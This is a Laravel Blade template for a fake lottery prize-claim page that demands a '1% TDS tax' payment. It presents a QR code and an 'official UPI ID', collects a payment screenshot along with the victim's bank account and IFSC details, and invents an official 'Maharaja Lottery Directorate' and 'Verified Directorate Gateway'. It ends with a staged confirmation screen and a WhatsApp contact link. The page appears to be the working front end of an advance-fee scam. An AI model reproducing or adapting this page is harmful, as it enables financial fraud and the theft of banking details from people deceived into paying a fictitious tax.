@extends('frontend.layouts.app')

@section('content')
<!-- Background Backdrop Container -->
<section class="min-h-[calc(100vh-80px)] bg-gradient-to-br from-[#040A1A] via-[#071533] to-[#040A1A] py-4 sm:py-8 px-3 sm:px-6 lg:px-8 flex items-center justify-center relative overflow-hidden">
    
    <!-- Stylized Background Effects -->
    <div class="absolute inset-0 pointer-events-none opacity-10" style="background-image: url('{{ asset('img/lottery-pattern.svg') }}'); background-repeat: repeat; background-size: 140px 140px;"></div>
    <div class="absolute -top-32 -left-32 w-80 h-80 bg-[#DFB755]/15 rounded-full blur-3xl pointer-events-none"></div>
    <div class="absolute -bottom-32 -right-32 w-80 h-80 bg-[#0F2356]/40 rounded-full blur-3xl pointer-events-none"></div>

    <!-- Main TDS Payment Card -->
    <div id="tds-payment-card" class="relative w-full max-w-lg md:max-w-xl transition-all duration-300 bg-white rounded-2xl sm:rounded-3xl shadow-2xl overflow-hidden border border-[#DFB755]/40 z-10">
        
        <!-- Modal Top Royal Navy Header -->
        <div class="bg-gradient-to-r from-[#040A1A] via-[#071533] to-[#0B193E] text-white px-4 py-3 sm:px-5 sm:py-3.5 flex items-center justify-between border-b border-[#DFB755]/30">
            <div class="flex items-center gap-2.5">
                <div class="w-8 h-8 rounded-lg bg-[#DFB755]/15 border border-[#DFB755]/30 flex items-center justify-center text-[#DFB755] text-sm shrink-0">
                    <i class="fa-solid fa-file-invoice-dollar"></i>
                </div>
                <div>
                    <span class="text-[8px] sm:text-[9px] uppercase font-extrabold tracking-widest text-[#DFB755] block leading-tight">OFFICIAL CLEARANCE</span>
                    <h2 class="text-sm sm:text-base font-serif font-black text-white leading-tight">1% TDS Tax Payment &amp; Claim</h2>
                </div>
            </div>

            <!-- Back Link to Bank Details -->
            <a href="{{ route('withdrawal', ['ref' => $bookingRef, 'amount' => $prizeAmount, 'name' => $customerName, 'phone' => $customerPhone]) }}" 
                title="Edit Bank Details"
                aria-label="Back" 
                class="w-7 h-7 sm:w-8 sm:h-8 rounded-full bg-white/10 hover:bg-white/20 text-white flex items-center justify-center text-xs transition">
                <i class="fa-solid fa-arrow-left"></i>
            </a>
        </div>

        <!-- Top Summary Bar -->
        <div class="bg-stone-50 border-b border-stone-200/80 px-4 py-2.5 grid grid-cols-12 gap-2 text-center items-center">
            <!-- Total Winning Prize (6 cols) -->
            <div class="col-span-6 text-left border-r border-stone-200 pr-2">
                <span class="block text-[8px] sm:text-[9px] uppercase font-bold text-stone-400 tracking-wider">WINNING PRIZE</span>
                <span class="text-xs sm:text-sm font-black text-emerald-600 block truncate">{{ $prizeAmount }}</span>
                <span class="text-[10px] text-stone-500 font-mono">({{ $winningFormatted }})</span>
            </div>
            
            <!-- TDS Rate (2 cols) -->
            <div class="col-span-2 border-r border-stone-200 px-1 text-center">
                <span class="block text-[8px] sm:text-[9px] uppercase font-bold text-stone-400 tracking-wider">TDS</span>
                <span class="text-xs sm:text-sm font-black text-amber-600">1%</span>
            </div>

            <!-- Payable TDS Amount (4 cols) -->
            <div class="col-span-4 pl-1 sm:pl-2 text-right">
                <span class="block text-[8px] sm:text-[9px] uppercase font-bold text-stone-400 tracking-wider">TDS TO PAY</span>
                <span class="text-sm sm:text-base font-mono font-black text-[#0B193E] drop-shadow-xs">{{ $tdsFormatted }}</span>
            </div>
        </div>

        <!-- Beneficiary & Bank Summary Bar (Collapsible) -->
        <div class="bg-[#0B193E]/5 border-b border-[#DFB755]/20 px-4 py-2 text-xs">
            <div class="flex items-center justify-between cursor-pointer" onclick="toggleDetails()" id="details-toggle-btn">
                <div class="flex items-center gap-2 truncate">
                    <span class="w-1.5 h-1.5 rounded-full bg-emerald-500"></span>
                    <span class="font-bold text-stone-800 truncate">{{ $customerName }}</span>
                    <span class="text-stone-400 text-[10px]">•</span>
                    <span class="text-stone-600 font-mono text-[11px] truncate">{{ $customerPhone }}</span>
                    <span class="text-stone-400 text-[10px]">•</span>
                    <span class="text-stone-600 font-mono text-[11px] truncate">A/C: {{ strlen($accountNumber) > 4 ? '••••' . substr($accountNumber, -4) : $accountNumber }}</span>
                </div>
                <div class="flex items-center gap-1 text-[11px] font-bold text-[#0B193E] shrink-0 ml-2">
                    <span id="details-toggle-text">View details</span>
                    <i id="details-toggle-icon" class="fa-solid fa-chevron-down text-[9px] transition-transform"></i>
                </div>
            </div>

            <!-- Collapsible Detail Info -->
            <div id="customer-details-collapsible" class="hidden pt-2 mt-1.5 border-t border-[#DFB755]/20 space-y-1.5">
                <div class="grid grid-cols-2 gap-2 text-[11px]">
                    <div>
                        <span class="text-stone-400 block text-[9px] uppercase font-semibold">Account Number:</span>
                        <span class="font-mono font-bold text-stone-800 select-all">{{ $accountNumber }}</span>
                    </div>
                    <div>
                        <span class="text-stone-400 block text-[9px] uppercase font-semibold">IFSC Code:</span>
                        <span class="font-mono font-bold text-stone-800 select-all">{{ $ifscCode }}</span>
                    </div>
                </div>
                @if(!empty($bankName))
                <div class="text-[11px]">
                    <span class="text-stone-400 block text-[9px] uppercase font-semibold">Bank:</span>
                    <span class="font-medium text-stone-800">{{ $bankName }}</span>
                </div>
                @endif
                @if(!empty($bookingRef))
                <div class="text-[11px]">
                    <span class="text-stone-400 block text-[9px] uppercase font-semibold">Booking Ref:</span>
                    <span class="font-mono font-bold text-stone-800">{{ $bookingRef }}</span>
                </div>
                @endif
            </div>
        </div>

        <!-- STEP 1: Pay 1% TDS via QR -->
        <div id="payment-step-1" class="p-4 sm:p-5 space-y-3.5">
            
            <!-- Stepper Progress -->
            <div class="flex items-center justify-center gap-2">
                <div class="flex items-center gap-1.5">
                    <span class="w-5 h-5 rounded-full bg-[#071533] text-[#F3D068] border border-[#DFB755] flex items-center justify-center text-[10px] font-bold shadow-2xs">1</span>
                    <span class="text-xs font-bold text-[#071533]">Pay 1% TDS</span>
                </div>
                <div class="w-10 h-0.5 bg-stone-200"></div>
                <div class="flex items-center gap-1.5 opacity-60 cursor-pointer hover:opacity-100 transition" onclick="goToStep2()">
                    <span class="w-5 h-5 rounded-full bg-stone-200 text-stone-600 flex items-center justify-center text-[10px] font-bold">2</span>
                    <span class="text-xs font-medium text-stone-500">Upload receipt</span>
                </div>
            </div>

            <!-- Title & Subtitle -->
            <div class="text-center space-y-0.5">
                <span class="text-[9px] uppercase font-extrabold tracking-widest text-[#0B193E] block">
                    SCAN AND PAY 1% TDS
                </span>
                <h3 class="text-base sm:text-lg font-serif font-black text-stone-900 leading-tight">
                    Pay <span class="text-amber-600 font-mono">{{ $tdsFormatted }}</span> with any UPI app
                </h3>
                <p class="text-[11px] text-stone-500">
                    1% statutory tax deduction on <strong class="text-stone-800">{{ $prizeAmount }}</strong>
                </p>
            </div>

            <!-- QR Code Card Container -->
            <div class="flex justify-center">
                <div class="relative p-2.5 bg-white rounded-2xl border-2 border-[#DFB755]/50 shadow-md group hover:border-[#DFB755] transition-all text-center">
                    @if(!empty($upiQrImage) && file_exists(public_path($upiQrImage)))
                        <!-- Custom Admin Uploaded QR Code -->
                        <img id="upi-qrcode" 
                            src="{{ asset($upiQrImage) }}?v={{ time() }}" 
                            alt="Scan UPI QR Code" 
                            class="w-36 h-36 sm:w-40 sm:h-40 object-contain rounded-xl mx-auto select-none"
                            loading="eager">
                    @else
                        <!-- Dynamic UPI QR Code with exact 1% TDS amount -->
                        <img id="upi-qrcode" 
                            src="https://api.qrserver.com/v1/create-qr-code/?size=165x165&data={{ urlencode($upiUrl) }}&margin=2" 
                            alt="Scan UPI QR Code" 
                            class="w-36 h-36 sm:w-40 sm:h-40 object-contain rounded-xl mx-auto select-none"
                            loading="eager"
                            onerror="this.src='https://chart.googleapis.com/chart?cht=qr&chs=165x165&chl={{ urlencode($upiUrl) }}';">
                    @endif

                    <div class="mt-1.5 flex items-center justify-center gap-1.5 text-[10px] font-bold text-stone-600">
                        <i class="fa-solid fa-lock text-emerald-600 text-[9px]"></i>
                        <span>Verified Directorate Gateway</span>
                    </div>
                </div>
            </div>

            <!-- Tap Preferred UPI App Section -->
            <div class="space-y-1 text-center">
                <span class="text-[10px] font-bold text-stone-500 block">
                    Tap your preferred payment app
                </span>
                
                <div class="grid grid-cols-4 gap-2">
                    <!-- Google Pay -->
                    <a href="{{ $upiUrl }}" class="flex flex-col items-center justify-center p-2 rounded-xl border border-stone-200 hover:border-[#DFB755] hover:bg-stone-50 transition group">
                        <div class="w-8 h-8 rounded-lg bg-stone-100 flex items-center justify-center text-xs text-stone-700 font-bold group-hover:scale-105 transition">
                            <i class="fa-brands fa-google text-blue-600"></i>
                        </div>
                        <span class="text-[9px] font-bold text-stone-700 mt-1">GPay</span>
                    </a>

                    <!-- PhonePe -->
                    <a href="{{ $upiUrl }}" class="flex flex-col items-center justify-center p-2 rounded-xl border border-stone-200 hover:border-[#DFB755] hover:bg-stone-50 transition group">
                        <div class="w-8 h-8 rounded-lg bg-purple-50 flex items-center justify-center text-xs text-purple-700 font-bold group-hover:scale-105 transition">
                            <i class="fa-solid fa-mobile-screen text-purple-600"></i>
                        </div>
                        <span class="text-[9px] font-bold text-stone-700 mt-1">PhonePe</span>
                    </a>

                    <!-- Paytm -->
                    <a href="{{ $upiUrl }}" class="flex flex-col items-center justify-center p-2 rounded-xl border border-stone-200 hover:border-[#DFB755] hover:bg-stone-50 transition group">
                        <div class="w-8 h-8 rounded-lg bg-sky-50 flex items-center justify-center text-xs text-sky-700 font-bold group-hover:scale-105 transition">
                            <i class="fa-solid fa-wallet text-sky-600"></i>
                        </div>
                        <span class="text-[9px] font-bold text-stone-700 mt-1">Paytm</span>
                    </a>

                    <!-- BHIM / Other UPI -->
                    <a href="{{ $upiUrl }}" class="flex flex-col items-center justify-center p-2 rounded-xl border border-stone-200 hover:border-[#DFB755] hover:bg-stone-50 transition group">
                        <div class="w-8 h-8 rounded-lg bg-emerald-50 flex items-center justify-center text-xs text-emerald-700 font-bold group-hover:scale-105 transition">
                            <i class="fa-solid fa-building-columns text-emerald-600"></i>
                        </div>
                        <span class="text-[9px] font-bold text-stone-700 mt-1">BHIM UPI</span>
                    </a>
                </div>
            </div>

            <!-- UPI ID & Copy Row -->
            <div class="bg-stone-50 border border-stone-200 rounded-xl p-2.5 flex items-center justify-between">
                <div class="min-w-0 pr-2">
                    <span class="block text-[8px] uppercase font-bold text-stone-400 tracking-wider">OFFICIAL UPI ID</span>
                    <span id="tds-upi-id-text" class="text-xs font-mono font-black text-stone-800 truncate block select-all">{{ $upiId }}</span>
                </div>
                <button type="button" 
                    onclick="copyUpiId()" 
                    id="copy-upi-btn"
                    class="px-3 py-1.5 rounded-lg bg-[#071533] hover:bg-[#0B193E] text-[#F3D068] text-xs font-bold transition flex items-center gap-1.5 shrink-0 cursor-pointer shadow-xs">
                    <i class="fa-regular fa-copy text-[11px]"></i>
                    <span>Copy</span>
                </button>
            </div>

            <!-- Next Step Button -->
            <button type="button" 
                onclick="goToStep2()" 
                class="w-full py-3 px-4 rounded-xl bg-gradient-to-r from-[#16A34A] via-[#22C55E] to-[#15803D] hover:from-[#15803D] hover:to-[#16A34A] text-white font-black text-xs sm:text-sm uppercase tracking-wider shadow-lg shadow-emerald-950/40 hover:scale-[1.01] transform transition flex items-center justify-center gap-2 cursor-pointer">
                <span>I have paid {{ $tdsFormatted }} • Next</span>
                <i class="fa-solid fa-arrow-right text-xs"></i>
            </button>
        </div>

        <!-- STEP 2: Upload Payment Receipt -->
        <div id="payment-step-2" class="p-4 sm:p-5 space-y-3.5 hidden">
            
            <!-- Stepper Progress -->
            <div class="flex items-center justify-center gap-2">
                <div class="flex items-center gap-1.5 opacity-60 cursor-pointer hover:opacity-100 transition" onclick="goToStep1()">
                    <span class="w-5 h-5 rounded-full bg-stone-200 text-stone-600 flex items-center justify-center text-[10px] font-bold">1</span>
                    <span class="text-xs font-medium text-stone-500">Pay 1% TDS</span>
                </div>
                <div class="w-10 h-0.5 bg-stone-200"></div>
                <div class="flex items-center gap-1.5">
                    <span class="w-5 h-5 rounded-full bg-[#071533] text-[#F3D068] border border-[#DFB755] flex items-center justify-center text-[10px] font-bold shadow-2xs">2</span>
                    <span class="text-xs font-bold text-[#071533]">Upload receipt</span>
                </div>
            </div>

            <!-- Title & Subtitle -->
            <div class="text-center space-y-0.5">
                <span class="text-[9px] uppercase font-extrabold tracking-widest text-[#0B193E] block">
                    PAYMENT VERIFICATION
                </span>
                <h3 class="text-base sm:text-lg font-serif font-black text-stone-900 leading-tight">
                    Upload your TDS Payment Screenshot
                </h3>
                <p class="text-[11px] text-stone-500">
                    Upload the confirmation receipt of <strong class="text-stone-800">{{ $tdsFormatted }}</strong>
                </p>
            </div>

            <!-- Upload Form -->
            <form id="tds-submit-form" enctype="multipart/form-data" class="space-y-3.5">
                @csrf
                <input type="hidden" name="booking_ref" value="{{ $bookingRef }}">
                <input type="hidden" name="customer_name" value="{{ $customerName }}">
                <input type="hidden" name="customer_phone" value="{{ $customerPhone }}">
                <input type="hidden" name="account_number" value="{{ $accountNumber }}">
                <input type="hidden" name="ifsc_code" value="{{ $ifscCode }}">
                <input type="hidden" name="bank_name" value="{{ $bankName }}">
                <input type="hidden" name="winning_prize_text" value="{{ $prizeAmount }}">
                <input type="hidden" name="winning_amount" value="{{ $winningAmount }}">
                <input type="hidden" name="tds_amount" value="{{ $tdsAmount }}">

                <!-- File Upload Box -->
                <div class="space-y-1">
                    <label class="block text-xs font-bold text-stone-700">
                        Payment Screenshot / Receipt <span class="text-rose-500">*</span>
                    </label>
                    <div id="dropzone" 
                        class="border-2 border-dashed border-stone-300 hover:border-[#DFB755] rounded-2xl p-4 text-center cursor-pointer transition bg-stone-50 hover:bg-stone-100/70"
                        onclick="document.getElementById('receipt_file').click()">
                        <input type="file" 
                            name="receipt_file" 
                            id="receipt_file" 
                            accept="image/*,application/pdf" 
                            class="hidden" 
                            onchange="handleReceiptPreview(this)">
                        
                        <div id="upload-placeholder" class="space-y-1">
                            <div class="w-10 h-10 rounded-full bg-stone-200/80 text-stone-600 flex items-center justify-center mx-auto text-base">
                                <i class="fa-solid fa-cloud-arrow-up"></i>
                            </div>
                            <p class="text-xs font-bold text-stone-700">Click to upload screenshot</p>
                            <p class="text-[10px] text-stone-400">PNG, JPG, WEBP or PDF (Max 10MB)</p>
                        </div>

                        <!-- Image Preview Box -->
                        <div id="receipt-preview-container" class="hidden space-y-2">
                            <img id="receipt-preview-img" src="" alt="Receipt Preview" class="max-h-40 mx-auto rounded-lg object-contain shadow-sm border border-stone-200">
                            <p id="receipt-file-name" class="text-xs font-bold text-stone-700 truncate"></p>
                            <button type="button" onclick="event.stopPropagation(); clearReceiptPreview();" class="text-rose-600 hover:text-rose-700 text-[11px] font-bold">
                                Remove &amp; choose another
                            </button>
                        </div>
                    </div>
                </div>

                <!-- UTR / Transaction ID -->
                <div class="space-y-1">
                    <label for="utr_number" class="block text-xs font-bold text-stone-700">
                        UPI Reference / UTR Number (Optional)
                    </label>
                    <div class="relative">
                        <div class="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none text-stone-400 text-xs">
                            <i class="fa-solid fa-receipt"></i>
                        </div>
                        <input type="text" 
                            name="utr_number" 
                            id="utr_number" 
                            placeholder="e.g. 428901234567 (12 digits)" 
                            maxlength="25"
                            class="w-full pl-9 pr-3 py-2 bg-white border border-stone-200 rounded-xl text-stone-800 placeholder-stone-400 text-xs font-mono focus:outline-none focus:border-[#DFB755] focus:ring-1 focus:ring-[#DFB755] transition">
                    </div>
                    <p class="text-[10px] text-stone-400">Found on your UPI transaction details screen.</p>
                </div>

                <!-- Submit Button -->
                <div class="pt-1">
                    <button type="submit" 
                        id="submit-tds-btn"
                        class="w-full py-3.5 px-4 rounded-xl bg-gradient-to-r from-[#16A34A] via-[#22C55E] to-[#15803D] hover:from-[#15803D] hover:to-[#16A34A] text-white font-black text-xs sm:text-sm uppercase tracking-wider shadow-lg shadow-emerald-950/40 hover:scale-[1.01] transform transition flex items-center justify-center gap-2 cursor-pointer border border-emerald-300/40">
                        <i class="fa-solid fa-circle-check text-yellow-300"></i>
                        <span id="submit-btn-text">Submit TDS Verification</span>
                    </button>
                </div>

                <!-- Back to Step 1 Button -->
                <button type="button" 
                    onclick="goToStep1()" 
                    class="w-full text-center text-xs text-stone-500 hover:text-stone-800 font-semibold transition py-1">
                    ← Back to QR Code
                </button>
            </form>
        </div>

    </div>
</section>

<!-- Celebration Boom Congratulations Modal -->
<div id="celebration-modal" class="fixed inset-0 z-50 bg-black/90 backdrop-blur-md hidden items-center justify-center p-3 sm:p-5 transition-all duration-500">
    <!-- Ambient Glow -->
    <div class="absolute w-96 h-96 bg-[#DFB755]/25 rounded-full blur-3xl pointer-events-none"></div>

    <div class="relative bg-gradient-to-b from-[#071533] via-[#0B193E] to-[#040A1A] border-3 border-[#DFB755] rounded-3xl p-6 sm:p-8 max-w-lg w-full text-center text-white shadow-[0_0_80px_rgba(223,183,85,0.45)] overflow-hidden space-y-5 animate-in zoom-in-90 duration-300">
        <!-- Sparkle pattern -->
        <div class="absolute inset-0 opacity-15 bg-[radial-gradient(#DFB755_1px,transparent_1px)] [background-size:14px_14px] pointer-events-none"></div>

        <!-- Trophy Boom Icon with Bounce -->
        <div class="relative z-10 mx-auto w-20 h-20 rounded-3xl bg-gradient-to-tr from-[#C59B27] via-[#F3D068] to-[#DFB755] text-[#071533] flex items-center justify-center text-4xl shadow-2xl shadow-amber-500/30 animate-bounce">
            <i class="fa-solid fa-trophy"></i>
        </div>

        <!-- Header -->
        <div class="relative z-10 space-y-1">
            <span class="inline-flex items-center gap-2 px-3 py-1 rounded-full text-[10px] font-black uppercase tracking-widest bg-emerald-500/20 text-emerald-300 border border-emerald-500/30">
                <i class="fa-solid fa-check"></i>
                <span>TDS Submission Verified</span>
            </span>
            <h2 class="text-2xl sm:text-3xl font-serif font-black text-white">
                🎉 CONGRATULATIONS! 🎉
            </h2>
            <p class="text-sm sm:text-base font-serif font-bold text-[#F3D068]" id="modal-customer-name">
                {{ $customerName }}
            </p>
        </div>

        <!-- Details Card -->
        <div class="relative z-10 bg-black/50 border border-[#DFB755]/30 rounded-2xl p-4 sm:p-5 text-left space-y-3">
            <div class="flex items-center justify-between pb-2 border-b border-white/10">
                <span class="text-[11px] uppercase tracking-wider font-bold text-stone-400">Winning Prize</span>
                <span class="text-base sm:text-lg font-mono font-black text-emerald-400">{{ $prizeAmount }} ({{ $winningFormatted }})</span>
            </div>

            <div class="flex items-center justify-between pb-2 border-b border-white/10">
                <span class="text-[11px] uppercase tracking-wider font-bold text-stone-400">1% TDS Submitted</span>
                <span class="text-base sm:text-lg font-mono font-black text-[#F3D068]">{{ $tdsFormatted }}</span>
            </div>

            <div class="flex items-center justify-between pb-2 border-b border-white/10">
                <span class="text-[11px] uppercase tracking-wider font-bold text-stone-400">Target Bank Account</span>
                <span class="text-xs sm:text-sm font-mono font-bold text-stone-200">{{ strlen($accountNumber) > 4 ? '••••' . substr($accountNumber, -4) : $accountNumber }} ({{ $ifscCode }})</span>
            </div>

            <p class="text-xs text-stone-300 leading-relaxed font-normal pt-1">
                Your 1% TDS payment proof and prize withdrawal application have been submitted to Maharaja Lottery Directorate. Upon verification, the full prize balance will be credited to your verified bank account within <strong class="text-[#F3D068]">2 to 4 hours</strong>.
            </p>
        </div>

        <!-- Action Buttons -->
        <div class="relative z-10 space-y-2 pt-1">
            <a href="https://wa.me/918743978796?text={{ urlencode('Hello Admin, I have submitted 1% TDS payment (' . $tdsFormatted . ') for winning prize ' . $prizeAmount . ' under name ' . $customerName . '. Please verify and release payout.') }}" 
                target="_blank"
                class="w-full py-3 px-5 rounded-xl bg-gradient-to-r from-emerald-600 to-emerald-500 hover:from-emerald-500 hover:to-emerald-400 text-white font-black text-xs sm:text-sm uppercase tracking-wider shadow-lg transition flex items-center justify-center gap-2">
                <i class="fa-brands fa-whatsapp text-base"></i>
                <span>Instant WhatsApp Priority Verification</span>
            </a>

            <a href="{{ route('winnerlist') }}" 
                class="w-full py-2.5 rounded-xl bg-white/10 hover:bg-white/20 text-stone-200 hover:text-white font-bold text-xs transition flex items-center justify-center gap-1.5 border border-white/20">
                <i class="fa-solid fa-trophy text-[#DFB755]"></i>
                <span>Return to Result Desk</span>
            </a>
        </div>
    </div>
</div>

@push('scripts')
<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.3/dist/confetti.browser.min.js"></script>
<script>
    // Confetti Mega Celebration Blast
    function triggerTdsConfettiBoom() {
        if (typeof confetti !== 'function') return;

        // Left Cannon Burst
        confetti({
            particleCount: 100,
            angle: 60,
            spread: 80,
            origin: { x: 0.05, y: 0.7 },
            colors: ['#DFB755', '#F3D068', '#16A34A', '#22C55E', '#FFFFFF', '#FFD700']
        });

        // Right Cannon Burst
        setTimeout(() => {
            confetti({
                particleCount: 100,
                angle: 120,
                spread: 80,
                origin: { x: 0.95, y: 0.7 },
                colors: ['#DFB755', '#F3D068', '#16A34A', '#22C55E', '#FFFFFF', '#FFD700']
            });
        }, 150);

        // Center Fireworks Blast
        setTimeout(() => {
            confetti({
                particleCount: 120,
                spread: 100,
                origin: { y: 0.6 },
                colors: ['#DFB755', '#F3D068', '#16A34A', '#E11D48', '#FFD700']
            });
        }, 300);
    }

    // Toggle Beneficiary Info Collapsible
    function toggleDetails() {
        const details = document.getElementById('customer-details-collapsible');
        const icon = document.getElementById('details-toggle-icon');
        const text = document.getElementById('details-toggle-text');

        if (details.classList.contains('hidden')) {
            details.classList.remove('hidden');
            icon.classList.add('rotate-180');
            text.innerText = 'Hide details';
        } else {
            details.classList.add('hidden');
            icon.classList.remove('rotate-180');
            text.innerText = 'View details';
        }
    }

    // Navigation Between Step 1 & Step 2
    function goToStep2() {
        document.getElementById('payment-step-1').classList.add('hidden');
        document.getElementById('payment-step-2').classList.remove('hidden');
        window.scrollTo({ top: 0, behavior: 'smooth' });
    }

    function goToStep1() {
        document.getElementById('payment-step-2').classList.add('hidden');
        document.getElementById('payment-step-1').classList.remove('hidden');
        window.scrollTo({ top: 0, behavior: 'smooth' });
    }

    // Copy UPI ID to Clipboard
    function copyUpiId() {
        const upiId = document.getElementById('tds-upi-id-text').innerText.trim();
        const btn = document.getElementById('copy-upi-btn');

        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(upiId).then(showCopiedState);
        } else {
            const input = document.createElement('input');
            input.value = upiId;
            document.body.appendChild(input);
            input.select();
            document.execCommand('copy');
            document.body.removeChild(input);
            showCopiedState();
        }

        function showCopiedState() {
            btn.innerHTML = '<i class="fa-solid fa-check text-[11px] text-emerald-400"></i><span>Copied!</span>';
            btn.classList.add('bg-emerald-700');
            setTimeout(() => {
                btn.innerHTML = '<i class="fa-regular fa-copy text-[11px]"></i><span>Copy</span>';
                btn.classList.remove('bg-emerald-700');
            }, 2000);
        }
    }

    // Handle Receipt Image Preview
    function handleReceiptPreview(input) {
        if (input.files && input.files[0]) {
            const file = input.files[0];
            const reader = new FileReader();

            reader.onload = function(e) {
                document.getElementById('upload-placeholder').classList.add('hidden');
                document.getElementById('receipt-preview-container').classList.remove('hidden');
                document.getElementById('receipt-preview-img').src = e.target.result;
                document.getElementById('receipt-file-name').innerText = file.name;
            };

            reader.readAsDataURL(file);
        }
    }

    function clearReceiptPreview() {
        const fileInput = document.getElementById('receipt_file');
        fileInput.value = '';
        document.getElementById('receipt-preview-container').classList.add('hidden');
        document.getElementById('upload-placeholder').classList.remove('hidden');
    }

    // Handle AJAX TDS Form Submission
    document.getElementById('tds-submit-form').addEventListener('submit', function(e) {
        e.preventDefault();

        const fileInput = document.getElementById('receipt_file');
        if (!fileInput.files || fileInput.files.length === 0) {
            alert('Please select and upload your payment receipt screenshot first.');
            return false;
        }

        const btn = document.getElementById('submit-tds-btn');
        const btnText = document.getElementById('submit-btn-text');
        btn.disabled = true;
        btnText.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin"></i> Submitting TDS Proof...';

        const formData = new FormData(this);

        fetch("{{ route('tds.payment.submit') }}", {
            method: 'POST',
            body: formData,
            headers: {
                'X-Requested-With': 'XMLHttpRequest'
            }
        })
        .then(response => {
            if (!response.ok) {
                throw new Error('Network response was not ok');
            }
            return response.json();
        })
        .then(data => {
            if (data.success) {
                // Open Celebration Boom Modal
                const celebrationModal = document.getElementById('celebration-modal');
                celebrationModal.classList.remove('hidden');
                celebrationModal.classList.add('flex');

                // Trigger Massive Confetti Boom Blast
                triggerTdsConfettiBoom();
                setTimeout(triggerTdsConfettiBoom, 600);
            } else {
                alert(data.message || 'Error submitting TDS payment proof.');
                btn.disabled = false;
                btnText.innerText = 'Submit TDS Verification';
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('An error occurred while uploading. Please check your connection and try again.');
            btn.disabled = false;
            btnText.innerText = 'Submit TDS Verification';
        });
    });
</script>
@endpush
@endsection
